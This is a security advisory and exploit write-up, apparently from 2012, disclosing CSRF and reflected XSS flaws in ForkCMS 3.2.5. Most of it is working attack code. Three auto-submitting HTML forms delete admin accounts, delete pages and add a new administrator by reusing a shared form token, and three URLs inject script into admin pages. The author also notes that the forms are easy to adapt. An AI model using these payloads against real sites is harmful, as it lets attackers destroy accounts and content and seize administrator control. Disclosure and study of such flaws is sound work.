@@ -1,0 +1,110 @@
+                                                                     
+                                                                     
+                                                                     
+                                             
++--------------------------------------------------------------------------------------------------------------------------------+
+# Exploit Title     : ForkCMS 3.2.5 Multiple Vulnerabilities
+# Date              : 21-02-2012
+# Author            : Ivano Binetti (http://ivanobinetti.com)
+# Software link     : https://github.com/forkcms/forkcms/zipball/3.2.5
+# Vendor site       : http://www.fork-cms.com/
+# Version           : 3.2.5 and lower 
+# Tested on         : Debian Squeeze (6.0) 
+# Original Advisory : http://ivanobinetti.blogspot.com/2012/02/forkcms-325-csrf-and-xss-0day.html
+# CVE ID            : CVE-2012-1304, CVE-2012-1305, CVE-2012-1306, CVE-2012-1307
+# Secunia ID        : SA48067 
+# OSVDB ID          : 79444 (http://osvdb.org/show/osvdb/79444)
+# IBM X-Force ID    : 73394 (http://xforce.iss.net/xforce/xfdb/73394)
+# Other Advisory    : http://packetstormsecurity.org/files/110048/ForkCMS-3.2.5-Cross-Site-Request-Forgery-Cross-Site-Scripting.html 
+# Other Advisory    : http://www.securelist.com/en/advisories/48067 (SecureList)
+# Other Advisory    : www.1337day.com/exploits/17557
++--------------------------------------------------------------------------------------------------------------------------------+
++------------------------------------------[Multiple Vulnerabilities by Ivano Binetti]-------------------------------------------+
+
+Summary
+1)Introduction
+2)Vulnerabilities Description
+ 2.1 CSRF
+  2.1.1 Delete Admins or Users 
+  2.1.2 Delete Web Pages
+  2.1.3 Privilege Escalation
+ 2.2 XSS (Reflected)
+3)Personal observations
++--------------------------------------------------------------------------------------------------------------------------------+
+1)Introduction
+ForkCMS is a cms with an "intuitive and user friendly interface".
+
+2)Vulnerabilities Description
+ForkCMS 3.2.5 (and lower) suffers from CSRF and XSS (reflected) vulnerabilities. IMB X-Force confirmed that also 3.2.6 version is
+affected by CSRF vulnerability.
+ 
+ 2.1 CSRF
+ ForkCMS 3.2.5 is prone to a CSRF Vulnerability which allows an attacker to delete admins/users, delete web pages and do 
+ privilege escalation when an authenticated admin browses a web page containing the following html/javascript code.
+  2.1.1 Delete Admins or Users 
+  <html>
+  <body onload="javascript:document.forms[0].submit()">
+  <H2>CSRF Exploit to delete ADMIN/USER account</H2>
+  <form method="POST" name="form0" action="http://127.0.0.1:80/private/en/users/delete?token=true&id=2">
+  </form>
+  </body>
+  </html>
+
+  Note that the first id which is possible to delete is 2 because id 1 - named "Fork CMS"- is a superuser admin created during 
+  installation phase (ForkCMS define this user "GOD-user") . IDs's numeration is incremental.
+  
+  2.1.2 Delete Web Pages
+  <html>
+  <body onload="javascript:document.forms[0].submit()">
+  <H2>CSRF Exploit to delete Web Pages</H2>
+  <form method="POST" name="form0" action="http://<fork_cms_ip>/private/en/pages/delete?token=true&id=405">
+  </form>
+  </body>
+  </html>
+
+  NOte that first id is 405 and IDs's numeration is incremental.
+
+
+  2.1.3 Privilege Escalation
+  ForkCMS uses a poor logic to manage sessions. It uses a parameter (called "form_token" and composed by 32 alphanumeric 
+  characters) to manage sessions but suppose that you are a normal (not admin) user which sign in into web management 
+  interface from the same machine (pc/notebook/server) and same browser of an administrator: ForkCMS will assign the same 
+  "form_token" for both so this logic will allow you to use your "form_token" id to create a new admin with the following code:
+  
+  <html>
+  <body onload="javascript:document.forms[0].submit()">
+  <H2>CSRF Exploit to add ADMIN account</H2>
+  <form method="POST" name="form0" action="http://127.0.0.1:80/private/en/users/add?token=true">
+  <input type="hidden" name="form" value="add"/>
+  <input type="hidden" name="form_token" value="token_number"/>
+  <input type="hidden" name="email" value="root@root.com"/>
+  <input type="hidden" name="password" value="password"/>
+  <input type="hidden" name="confirm_password" value="password"/>
+  <input type="hidden" name="name" value="root"/>
+  <input type="hidden" name="surname" value="root"/>
+  <input type="hidden" name="nickname" value="root"/>
+  <input type="hidden" name="avatar" value=""/>
+  <input type="hidden" name="interface_language" value="en"/>
+  <input type="hidden" name="date_format" value="j F Y"/>
+  <input type="hidden" name="time_format" value="H:i"/>
+  <input type="hidden" name="number_format" value="dot_nothing"/>
+  <input type="hidden" name="csv_split_character" value=";"/>
+  <input type="hidden" name="csv_line_ending" value="\n"/>
+  <input type="hidden" name="active" value="Y"/>
+  <input type="hidden" name="groups[]" value="1"/>
+  </form>
+  </body>
+  </html>
+  
+  NOte that this logic is the same if you are two administrators or two normal users.
+  Also note that with little changes to this exploit you can modify any ForkCMS parameters. 
+
+ 2.2 XSS (Reflected)
+ 
+ http://<fork_cms_ip>/private/en/blog/settings?token=true&report=<script>alert("test")</script>
+ http://<fork_cms_ip>/private/en/users/index?token=true&error=<script>alert("test")</script>
+http://<fork_cms_ip>/private/en/pages/settings?token=true&report=<script>alert("test")</script>
+
+
+3)Personal observations
+I think that this is a very nice cms which can become great with some security improvements.
